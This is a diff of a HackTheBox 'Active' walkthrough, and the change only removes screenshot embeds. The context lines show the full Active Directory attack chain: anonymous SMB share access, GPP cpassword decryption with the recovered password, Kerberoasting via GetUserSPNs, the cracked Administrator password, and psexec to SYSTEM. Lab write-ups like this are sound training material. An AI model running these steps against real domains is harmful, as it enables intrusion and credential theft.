@@ -29,8 +29,6 @@ nmap -p53,88,135,139,389,445,464,636,3268 -sCV <target>
 
 A Domain Controller footprint. Add `active.htb` to `/etc/hosts`.
 
-![Nmap scan of the Domain Controller](../images/active-01-nmap.png)
-
 ### SMB — anonymous Replication share
 
 ```bash
@@ -50,8 +48,6 @@ Pull it recursively:
 smbclient //<target>/Replication -N -c "prompt OFF; recurse ON; mget *"
 ```
 
-![Anonymous access to the Replication share and Groups.xml path](../images/active-02-smb-replication.png)
-
 ---
 
 ## Foothold — GPP cpassword (MS14-025)
@@ -69,8 +65,6 @@ The AES key used by GPP is public, so the value decrypts instantly:
 gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
 # GPPstillStandingStrong2k18
 ```
-
-![gpp-decrypt recovering the SVC_TGS password](../images/active-03-gpp-decrypt.png)
 
 Validate and grab the user flag:
 
@@ -92,8 +86,6 @@ GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip <target> -
 # $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS...*$...
 ```
 
-![GetUserSPNs requesting the Administrator TGS](../images/active-04-kerberoast.png)
-
 Crack the TGS:
 
 ```bash
@@ -106,8 +98,6 @@ Use the cracked Domain Admin password for a SYSTEM shell:
 ```bash
 psexec.py active.htb/Administrator:'Ticketmaster1968'@<target>
 ```
-
-![psexec as Administrator → SYSTEM](../images/active-05-psexec-system.png)
 
 ```
 C:\> whoami
